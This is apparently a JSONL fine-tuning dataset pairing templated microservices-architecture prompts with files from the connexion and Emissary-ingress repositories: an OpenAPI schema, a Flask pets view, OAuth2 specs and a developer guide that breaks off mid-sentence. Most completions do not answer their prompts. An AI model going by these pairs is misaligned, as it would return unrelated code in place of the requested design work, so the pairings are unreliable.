\"not\": {\n        \"required\": [\n          \"schema\",\n          \"content\"\n        ]\n      },\n      \"oneOf\": [\n        {\n          \"required\": [\n            \"schema\"\n          ]\n        },\n        {\n          \"required\": [\n            \"content\"\n          ],\n          \"description\": \"Some properties are not allowed if content is present\",\n          \"allOf\": [\n            {\n              \"not\": {\n                \"required\": [\n                  \"style\"\n                ]\n              }\n            },\n            {\n              \"not\": {\n                \"required\": [\n                  \"explode\"\n                ]\n              }\n            },\n            {\n              \"not\": {\n                \"required\": [\n                  \"allowReserved\"\n                ]\n              }\n            },\n            {\n              \"not\": {\n                \"required\": [\n                  \"example\"\n                ]\n              }\n            },\n            {\n              \"not\": {\n                \"required\": [\n                  \"examples\"\n                ]\n              }\n            }\n          ]\n        }\n      ]\n    },\n    \"Parameter\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"type\": \"string\"\n        },\n        \"in\": {\n          \"type\": \"string\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"required\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"deprecated\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"allowEmptyValue\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"style\": {\n          \"type\": \"string\"\n        },\n        \"explode\": {\n          \"type\": \"boolean\"\n        },\n        \"allowReserved\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"schema\": {\n          \"oneOf\": [\n            {\n              \"$ref\": \"#/definitions/Schema\"\n            },\n            {\n              \"$ref\": \"#/definitions/Reference\"\n            }\n          ]\n        },\n        \"content\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"#/definitions/MediaType\"\n          },\n          \"minProperties\": 1,\n          \"maxProperties\": 1\n        },\n        \"example\": {\n        },\n        \"examples\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"oneOf\": [\n              {\n                \"$ref\": \"#/definitions/Example\"\n              },\n              {\n                \"$ref\": \"#/definitions/Reference\"\n              }\n            ]\n          }\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false,\n      \"required\": [\n        \"name\",\n        \"in\"\n      ],\n      \"allOf\": [\n        {\n          \"$ref\": \"#/definitions/ExampleXORExamples\"\n        },\n        {\n          \"$ref\": \"#/definitions/SchemaXORContent\"\n        },\n        {\n          \"$ref\": \"#/definitions/ParameterLocation\"\n        }\n      ]\n    },\n    \"ParameterLocation\": {\n      \"description\": \"Parameter location\",\n      \"oneOf\": [\n        {\n          \"description\": \"Parameter in path\",\n          \"required\": [\n            \"required\"\n          ],\n          \"properties\": {\n            \"in\": {\n              \"enum\": [\n                \"path\"\n              ]\n            },\n            \"style\": {\n              \"enum\": [\n                \"matrix\",\n                \"label\",\n                \"simple\"\n              ],\n              \"default\": \"simple\"\n            },\n            \"required\": {\n              \"enum\": [\n                true\n              ]\n            }\n          }\n        },\n        {\n          \"description\": \"Parameter in query\",\n          \"properties\": {\n            \"in\": {\n              \"enum\": [\n                \"query\"\n              ]\n            },\n            \"style\": {\n              \"enum\": [\n                \"form\",\n                \"spaceDelimited\",\n                \"pipeDelimited\",\n                \"deepObject\"\n              ],\n              \"default\": \"form\"\n            }\n          }\n        },\n        {\n          \"description\": \"Parameter in header\",\n          \"properties\": {\n            \"in\": {\n              \"enum\": [\n                \"header\"\n              ]\n            },\n            \"style\": {\n              \"enum\": [\n                \"simple\"\n              ],\n              \"default\": \"simple\"\n            }\n          }\n        },\n        {\n          \"description\": \"Parameter in cookie\",\n          \"properties\": {\n            \"in\": {\n              \"enum\": [\n                \"cookie\"\n              ]\n            },\n            \"style\": {\n              \"enum\": [\n                \"form\"\n              ],\n              \"default\": \"form\"\n            }\n          }\n        }\n      ]\n    },\n    \"RequestBody\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"content\"\n      ],\n      \"properties\": {\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"content\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"#/definitions/MediaType\"\n          }\n        },\n        \"required\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"SecurityScheme\": {\n      \"oneOf\": [\n        {\n          \"$ref\": \"#/definitions/APIKeySecurityScheme\"\n        },\n        {\n          \"$ref\": \"#/definitions/HTTPSecurityScheme\"\n        },\n        {\n          \"$ref\": \"#/definitions/OAuth2SecurityScheme\"\n        },\n        {\n          \"$ref\": \"#/definitions/OpenIdConnectSecurityScheme\"\n        }\n      ]\n    },\n    \"APIKeySecurityScheme\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"type\",\n        \"name\",\n        \"in\"\n      ],\n      \"properties\": {\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"apiKey\"\n          ]\n        },\n        \"name\": {\n          \"type\": \"string\"\n        },\n        \"in\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"header\",\n            \"query\",\n            \"cookie\"\n          ]\n        },\n        \"description\": {\n          \"type\": \"string\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"HTTPSecurityScheme\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"scheme\",\n        \"type\"\n      ],\n      \"properties\": {\n        \"scheme\": {\n          \"type\": \"string\"\n        },\n        \"bearerFormat\": {\n          \"type\": \"string\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"http\"\n          ]\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false,\n      \"oneOf\": [\n        {\n          \"description\": \"Bearer\",\n          \"properties\": {\n            \"scheme\": {\n              \"enum\": [\n                \"bearer\"\n              ]\n            }\n          }\n        },\n        {\n          \"description\": \"Non Bearer\",\n          \"not\": {\n            \"required\": [\n              \"bearerFormat\"\n            ]\n          },\n          \"properties\": {\n            \"scheme\": {\n              \"not\": {\n                \"enum\": [\n                  \"bearer\"\n                ]\n              }\n            }\n          }\n        }\n      ]\n    },\n    \"OAuth2SecurityScheme\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"type\",\n        \"flows\"\n      ],\n      \"properties\": {\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"oauth2\"\n          ]\n        },\n        \"flows\": {\n          \"$ref\": \"#/definitions/OAuthFlows\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"OpenIdConnectSecurityScheme\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"type\",\n        \"openIdConnectUrl\"\n      ],\n      \"properties\": {\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"openIdConnect\"\n          ]\n        },\n        \"openIdConnectUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"OAuthFlows\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"implicit\": {\n          \"$ref\": \"#/definitions/ImplicitOAuthFlow\"\n        },\n        \"password\": {\n          \"$ref\": \"#/definitions/PasswordOAuthFlow\"\n        },\n        \"clientCredentials\": {\n          \"$ref\": \"#/definitions/ClientCredentialsFlow\"\n        },\n        \"authorizationCode\": {\n          \"$ref\": \"#/definitions/AuthorizationCodeOAuthFlow\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"ImplicitOAuthFlow\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"authorizationUrl\",\n        \"scopes\"\n      ],\n      \"properties\": {\n        \"authorizationUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        },\n        \"refreshUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        },\n        \"scopes\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"type\": \"string\"\n          }\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"PasswordOAuthFlow\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"tokenUrl\"\n      ],\n      \"properties\": {\n        \"tokenUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        },\n        \"refreshUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        },\n        \"scopes\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"type\": \"string\"\n          }\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"ClientCredentialsFlow\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"tokenUrl\"\n      ],\n      \"properties\": {\n        \"tokenUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        },\n        \"refreshUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        },\n        \"scopes\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"type\": \"string\"\n          }\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"AuthorizationCodeOAuthFlow\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"authorizationUrl\",\n        \"tokenUrl\"\n      ],\n      \"properties\": {\n        \"authorizationUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        },\n        \"tokenUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        },\n        \"refreshUrl\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        },\n        \"scopes\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"type\": \"string\"\n          }\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"Link\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"operationId\": {\n          \"type\": \"string\"\n        },\n        \"operationRef\": {\n          \"type\": \"string\",\n          \"format\": \"uri-reference\"\n        },\n        \"parameters\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n          }\n        },\n        \"requestBody\": {\n        },\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"server\": {\n          \"$ref\": \"#/definitions/Server\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      },\n      \"additionalProperties\": false,\n      \"not\": {\n        \"description\": \"Operation Id and Operation Ref are mutually exclusive\",\n        \"required\": [\n          \"operationId\",\n          \"operationRef\"\n        ]\n      }\n    },\n    \"Callback\": {\n      \"type\": \"object\",\n      \"additionalProperties\": {\n        \"$ref\": \"#/definitions/PathItem\"\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n        }\n      }\n    },\n    \"Encoding\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"contentType\": {\n          \"type\": \"string\"\n        },\n        \"headers\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"#/definitions/Header\"\n          }\n        },\n        \"style\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"form\",\n            \"spaceDelimited\",\n            \"pipeDelimited\",\n            \"deepObject\"\n          ]\n        },\n        \"explode\": {\n          \"type\": \"boolean\"\n        },\n        \"allowReserved\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        }\n      },\n      \"additionalProperties\": false\n    }\n  }\n}", "metadata": {"source": "github.com/spec-first/connexion", "file_path": "connexion/resources/schemas/v3.0/schema.json", "language": "json", "complexity": "complex", "star_count": 4553, "quality_score": 0.5, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 1654}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import datetime\n\nfrom connexion import NoContent\nfrom flask.views import MethodView\n\n\ndef example_decorator(f):\n    \"\"\"\n    the returned view from <class>.as_view can be decorated\n    the decorator is initialized exactly once per class\n    \"\"\"\n\n    def decorator(*args, **kwargs):\n        return f(*args, **kwargs)\n\n    return decorator\n\n\nclass PetsView(MethodView):\n    \"\"\"Create Pets service\"\"\"\n\n    decorators = [example_decorator]\n    pets = {}\n\n    def __init__(self, pets=None):\n        # the args and kwargs can be provided\n        # via the MethodViewResolver's class_params dict\n        if pets is not None:\n            self.pets = pets\n\n    def post(self, body: dict):\n        name = body.get(\"name\")\n        tag = body.get(\"tag\")\n        count = len(self.pets)\n        pet = {}\n        pet[\"id\"] = count + 1\n        pet[\"tag\"] = tag\n        pet[\"name\"] = name\n        pet[\"last_updated\"] = datetime.datetime.now()\n        self.pets[pet[\"id\"]] = pet\n        return pet, 201\n\n    def put(self, petId, body: dict):\n        name = body[\"name\"]\n        tag = body.get(\"tag\")\n        pet = self.pets.get(petId, {\"id\": petId})\n        pet[\"name\"] = name\n        pet[\"tag\"] = tag\n        pet[\"last_updated\"] = datetime.datetime.now()\n        self.pets[petId] = pet\n        return self.pets[petId], 201\n\n    def delete(self, petId):\n        id_ = int(petId)\n        if self.pets.get(id_) is None:\n            return NoContent, 404\n        del self.pets[id_]\n        return NoContent, 204\n\n    def get(self, petId=None, limit=100):\n        if petId is None:\n            # NOTE: we need to wrap it with list for Python 3 as\n            # dict_values is not JSON serializable\n            return list(self.pets.values())[0:limit]\n        if self.pets.get(petId) is None:\n            return NoContent, 404\n        return self.pets[petId]\n", "metadata": {"source": "github.com/spec-first/connexion", "file_path": "examples/methodresolver/api/petsview.py", "language": "python", "complexity": "simple", "star_count": 4553, "quality_score": 0.75, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 68}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "openapi: 3.0.0\n\ninfo:\n  title: OAuth Example\n  version: \"1.0\"\n\nservers:\n  - url: /openapi\n\npaths:\n  /secret:\n    get:\n      summary: Return secret string\n      operationId: app.get_secret\n      responses:\n        '200':\n          description: secret response\n          content:\n            'text/plain':\n              schema:\n                type: string\n      security:\n        # enable authentication and require the \"uid\" scope for this endpoint\n        - oauth2: ['uid']\n\ncomponents:\n  securitySchemes:\n    oauth2:\n      type: oauth2\n      x-tokenInfoUrl: http://localhost:7979/tokeninfo\n      flows:\n        implicit:\n          authorizationUrl: https://example.com/oauth2/dialog\n          # the token info URL is hardcoded for our mock_tokeninfo.py script\n          # you can also pass it as an environment variable TOKENINFO_URL\n          scopes:\n            uid: Unique identifier of the user accessing the service.\n", "metadata": {"source": "github.com/spec-first/connexion", "file_path": "examples/oauth2/spec/openapi.yaml", "language": "yaml", "complexity": "simple", "star_count": 4553, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 38}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "swagger: \"2.0\"\n\ninfo:\n  title: OAuth Example\n  version: \"1.0\"\n\nbasePath: /swagger\n\npaths:\n  /secret:\n    get:\n      summary: Return secret string\n      operationId: app.get_secret\n      responses:\n        '200':\n          description: secret response\n          schema:\n            type: string\n      security:\n        # enable authentication and require the \"uid\" scope for this endpoint\n        - oauth2: ['uid']\n\nsecurityDefinitions:\n  oauth2:\n    type: oauth2\n    flow: implicit\n    authorizationUrl: https://example.com/oauth2/dialog\n    # the token info URL is hardcoded for our mock_tokeninfo.py script\n    # you can also pass it as an environment variable TOKENINFO_URL\n    x-tokenInfoUrl: http://localhost:7979/tokeninfo\n    scopes:\n      uid: Unique identifier of the user accessing the service.\n", "metadata": {"source": "github.com/spec-first/connexion", "file_path": "examples/oauth2/spec/swagger.yaml", "language": "yaml", "complexity": "simple", "star_count": 4553, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 33}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "openapi: 3.0.0\n\ninfo:\n  title: OAuth Example\n  version: \"1.0\"\n\nservers:\n  - url: /openapi\n\npaths:\n  /secret:\n    get:\n      summary: Return secret string\n      operationId: app.get_secret\n      responses:\n        '200':\n          description: secret response\n          content:\n            text/plain:\n              schema:\n                type: string\n      security:\n        # enable authentication and require the \"uid\" scope for this endpoint\n        - oauth2: ['uid']\n\ncomponents:\n  securitySchemes:\n    oauth2:\n      type: oauth2\n      x-tokenInfoFunc: app.token_info\n      flows:\n        implicit:\n          authorizationUrl: https://example.com/oauth2/dialog\n          scopes:\n            uid: Unique identifier of the user accessing the service.\n", "metadata": {"source": "github.com/spec-first/connexion", "file_path": "examples/oauth2_local_tokeninfo/spec/openapi.yaml", "language": "yaml", "complexity": "simple", "star_count": 4553, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 36}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "swagger: \"2.0\"\n\ninfo:\n  title: OAuth Example\n  version: \"1.0\"\n\nbasePath: /swagger\n\npaths:\n  /secret:\n    get:\n      summary: Return secret string\n      operationId: app.get_secret\n      responses:\n        '200':\n          description: secret response\n          schema:\n            type: string\n      security:\n        # enable authentication and require the \"uid\" scope for this endpoint\n        - oauth2: ['uid']\n\nsecurityDefinitions:\n  oauth2:\n    type: oauth2\n    flow: implicit\n    authorizationUrl: https://example.com/oauth2/dialog\n    x-tokenInfoFunc: app.token_info\n    scopes:\n      uid: Unique identifier of the user accessing the service.\n", "metadata": {"source": "github.com/spec-first/connexion", "file_path": "examples/oauth2_local_tokeninfo/spec/swagger.yaml", "language": "yaml", "complexity": "simple", "star_count": 4553, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 31}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Developing Emissary-ingress\n\nWelcome to the Emissary-ingress Community!\n\nThank you for contributing, we appreciate small and large contributions and look forward to working with you to make Emissary-ingress better.\n\nThis document is intended for developers looking to contribute to the Emissary-ingress project. In this document you will learn how to get your development environment setup and how to contribute to the project. Also, you will find more information about the internal components of Emissary-ingress and other questions about working on the project.\n\n> Looking for end user guides for Emissary-ingress? You can check out the end user guides at <https://www.getambassador.io/docs/emissary/>.\n\nAfter reading this document if you have questions we encourage you to join us on our [Slack channel](https://communityinviter.com/apps/cloud-native/cncf) in the #emissary-ingress channel.\n\n- [Code of Conduct](../Community/CODE_OF_CONDUCT.md)\n- [Governance](../Community/GOVERNANCE.md)\n- [Maintainers](../Community/MAINTAINERS.md)\n\n## Table of Contents\n\n- [Table of Contents](#table-of-contents)\n- [Development Setup](#development-setup)\n  - [Step 1: Install Build Dependencies](#step-1-install-build-dependencies)\n  - [Step 2: Clone Project](#step-2-clone-project)\n  - [Step 3: Configuration](#step-3-configuration)\n  - [Step 4: Building](#step-4-building)\n  - [Step 5: Push](#step-5-push)\n  - [Step 6: Deploy](#step-6-deploy)\n  - [Step 7: Dev-loop](#step-7-dev-loop)\n  - [What should I do next?](#what-should-i-do-next)\n- [Contributing](#contributing)\n  - [Submitting a Pull Request (PR)](#submitting-a-pull-request-pr)\n  - [Pull Request Review Process](#pull-request-review-process)\n  - [Rebasing a branch under review](#rebasing-a-branch-under-review)\n  - [Fixup commits during PR review](#fixup-commits-during-pr-review)\n- [Development Workflow](#development-workflow)\n  - [Branching Strategy](#branching-strategy)\n  - [Backport Strategy](#backport-strategy)\n    - [What if I need a patch to land in a previous supported version?](#what-if-i-need-a-patch-to-land-in-a-previous-supported-version)\n    - [What if my patch is only for a previous supported version?](#what-if-my-patch-is-only-for-a-previous-supported-version)\n    - [What if I'm still not sure?](#what-if-im-still-not-sure)\n  - [Merge Strategy](#merge-strategy)\n    - [What about merge commit strategy?](#what-about-merge-commit-strategy)\n- [Contributing to the Docs](#contributing-to-the-docs)\n- [Advanced Topics](#advanced-topics)\n  - [Running Emissary-ingress internals locally](#running-emissary-ingress-internals-locally)\n    - [Setting up diagd](#setting-up-diagd)\n    - [Changing the ambassador root](#changing-the-ambassador-root)\n    - [Getting envoy](#getting-envoy)\n    - [Shutting up the pod labels error](#shutting-up-the-pod-labels-error)\n    - [Extra credit](#extra-credit)\n  - [Debugging and Developing Envoy Configuration](#debugging-and-developing-envoy-configuration)\n  - [Making changes to Envoy](#making-changes-to-envoy)\n    - [1. Preparing your machine](#1-preparing-your-machine)\n    - [2. Setting up your workspace to hack on Envoy](#2-setting-up-your-workspace-to-hack-on-envoy)\n    - [3. Hacking on Envoy](#3-hacking-on-envoy)\n    - [4. Building and testing your hacked-up Envoy](#4-building-and-testing-your-hacked-up-envoy)\n    - [5. Test Devloop](#5-test-devloop)\n    - [6. Protobuf changes](#6-protobuf-changes)\n    - [7. Finalizing your changes](#7-finalizing-your-changes)\n    - [8. Final Checklist](#8-final-checklist)\n  - [Developing Emissary-ingress (Maintainers-only advice)](#developing-emissary-ingress-maintainers-only-advice)\n    - [Updating license documentation](#updating-license-documentation)\n    - [Upgrading Python dependencies](#upgrading-python-dependencies)\n- [FAQ](#faq)\n  - [How do I find out what build targets are available?](#how-do-i-find-out-what-build-targets-are-available)\n  - [How do I develop on a Mac with Apple Silicon?](#how-do-i-develop-on-a-mac-with-apple-silicon)\n  - [How do I develop on Windows using WSL?](#how-do-i-develop-on-windows-using-wsl)\n  - [How do I test using a private Docker repository?](#how-do-i-test-using-a-private-docker-repository)\n  - [How do I change the loglevel at runtime?](#how-do-i-change-the-loglevel-at-runtime)\n  - [Can I build from a docker container instead of on my local computer?](#can-i-build-from-a-docker-container-instead-of-on-my-local-computer)\n  - [How do I clear everything out to make sure my build runs like it will in CI?](#how-do-i-clear-everything-out-to-make-sure-my-build-runs-like-it-will-in-ci)\n  - [My editor is changing `go.mod` or `go.sum`, should I commit that?](#my-editor-is-changing-gomod-or-gosum-should-i-commit-that)\n  - [How do I debug \"This should not happen in CI\" errors?](#how-do-i-debug-this-should-not-happen-in-ci-errors)\n  - [How do I run Emissary-ingress tests?](#how-do-i-run-emissary-ingress-tests)\n  - [How do I type check my python code?](#how-do-i-type-check-my-python-code)\n\n## Development Setup\n\nThis section provides the steps for getting started developing on Emissary-ingress. There are a number of prerequisites that need to be setup. In general, our tooling tries to detect any missing requirements and provide a friendly error message. If you ever find that this is not the case please file an issue.\n\n> **Note:** To enable developers contributing on Macs with Apple Silicon, we ensure that the artifacts are built for `linux/amd64`\n> rather than the host `linux/arm64` architecture. This can be overriden using the `BUILD_ARCH` environment variable. Pull Request are welcome :).\n\n### Step 1: Install Build Dependencies\n\nHere is a list of tools that are used by the build system to generate the build artifacts, packaging them up into containers, generating  crds, helm charts and for running tests.\n\n- git\n- make\n- docker (make sure you can run docker commands as your dev user without sudo)\n- bash\n- rsync\n- golang - `go.mod` for current version\n- python (>=3.10.9)\n- kubectl\n- a kubernetes cluster (you need permissions to create resources, i.e. crds, deployments, services, etc...)\n- a Docker registry\n- bsdtar (Provided by libarchive-tools on Ubuntu 19.10 and newer)\n- gawk\n- jq\n- helm\n\n### Step 2: Clone Project\n\nIf you haven't already then this would be a good time to clone the project running the following commands:\n\n```bash\n# clone to your preferred folder\ngit clone https://github.com/emissary-ingress/emissary.git\n\n# navigate to project\ncd emissary\n```\n\n### Step 3: Configuration\n\nYou can configure the build system using environment variables, two required variables are used for setting the container registry and the kubeconfig used.\n\n> **Important**: the test and build system perform destructive operations against your cluster. Therefore, we recommend that you\n> use a development cluster. Setting the DEV_KUBECONFIG variable described below ensures you don't accidently perform actions on a production cluster.\n\nOpen a terminal in the location where you cloned the repository and run the following commands:\n\n```bash\n# set container registry using `export DEV_REGISTRY=<your-registry>\n# note: you need to be logged in and have permissions to push\n# Example:\nexport DEV_REGISTRY=docker.io/parsec86\n\n# set kube config file using `export DEV_KUBECONFIG=<dev-kubeconfig>`\n# your cluster needs the ability to read from the configured container registry\nexport DEV_KUBECONFIG=\"$HOME/.kube/dev-config.yaml\"\n\n```\n\n### Step 4: Building\n\nThe build system for this project leverages `make` and multi-stage `docker` builds to produce the following containers:\n\n- `emissary.local/emissary` - single deployable container for Emissary-ingress\n- `emissary.local/kat-client` - test client container used for testing\n- `emissary.local/kat-server` - test server container used for testing\n\nUsing the terminal session you opened in step 2, run the following commands\n\n>\n\n```bash\n# This will pull and build the necessary docker containers and produce multiple containers.\n# If this is the first time running this command it will take a little bit while the base images are built up and cached.\nmake images\n\n# verify containers were successfully created, you should also see some of the intermediate builder containers as well\ndocker images | grep emissary.local\n```\n\n*What just happened?*\n\nThe build system generated a build container that pulled in envoy, the build dependencies, built various binaries from within this project and packaged them into a single deployable container. More information on this can be found in the [Architecture Document](ARCHITECTURE.md).\n\n### Step 5: Push\n\nNow that you have successfully built the containers its time to push them to your container registry which you setup in step 2.\n\nIn the same terminal session you can run the following command:\n\n```bash\n# re-tags the images and pushes them to your configured container registry\n# docker must be able to login to your registry and you have to have push permissions\nmake push\n\n# you can view the newly tag images by running\ndocker images | grep <your -registry>\n\n# alternatively, we have two make targets that provide information as well\nmake env\n\n# or in a bash export friendly format\nmake export\n```\n\n### Step 6: Deploy\n\nNow its time to deploy the container out to your Kubernetes cluster that was configured in step 2. Hopefully, it is already becoming apparent that we love to leverage Make to handle the complexity for you :).\n\n```bash\n# generate helm charts and K8's Configs with your container swapped in and apply them to your cluster\nmake deploy\n\n# check your cluster to see if emissary is running\n# note: kubectl doesn't know about  DEV_KUBECONFIG so you may need to ensure KUBECONFIG is pointing to the correct cluster\nkubectl get pod -n ambassador\n```\n\n🥳 If all has gone well then you should have your development environment setup for building and testing Emissary-ingress.\n\n### Step 7: Dev-loop\n\nNow that you are all setup and able to deploy a development container of Emissary-ingress to a cluster, it is time to start making some changes.\n\nLookup an issue that you want to work on, assign it to yourself and if you have any questions feel free to ping us on slack in the #emissary-dev channel.\n\nMake a change to Emissary-ingress and when you want to test it in a live cluster just re-run\n\n`make deploy`\n\nThis will:\n\n- recompile the go binary\n- rebuild containers\n- push them to the docker registry\n- rebuild helm charts and manifest\n- reapply manifest to cluster and re-deploy Emissary-ingress to the cluster\n\n> *Do I have to run the other make targets `make images` or `make push` ?*\n> No you don't have to because `make deploy` will actually run those commands for you. The steps above were meant to introduce you to the various make targets so that you aware of them and have options when developing.\n\n### What should I do next?\n\nNow that you have your dev system up and running here are some additional content that we recommend you check out:\n\n- [Emissary-ingress Architecture](ARCHITECTURE.md)\n- [Contributing Code](#contributing)\n- [Contributing to Docs](#contributing-to-the-docs)\n- [Advanced Topics](#advanced-topics)\n- [Faq](#faq)\n\n## Contributing\n\nThis section goes over how to contribute code to the project and how to get started contributing. More information on how we manage our branches can be found below in [Development Workflow](#development-workflow).\n\nBefore contributing be sure to read our [Code of Conduct](../Community/CODE_OF_CONDUCT.md) and [Governance](../Community/GOVERNANCE.md) to get an understanding of how our project is structured.\n\n### Submitting a Pull Request (PR)\n\n> If you haven't set up your development environment then please see the [Development Setup](#development-setup) section.\n\nWhen submitting a Pull Request (PR) here are a set of guidelines to follow:\n\n1. Search for an [existing 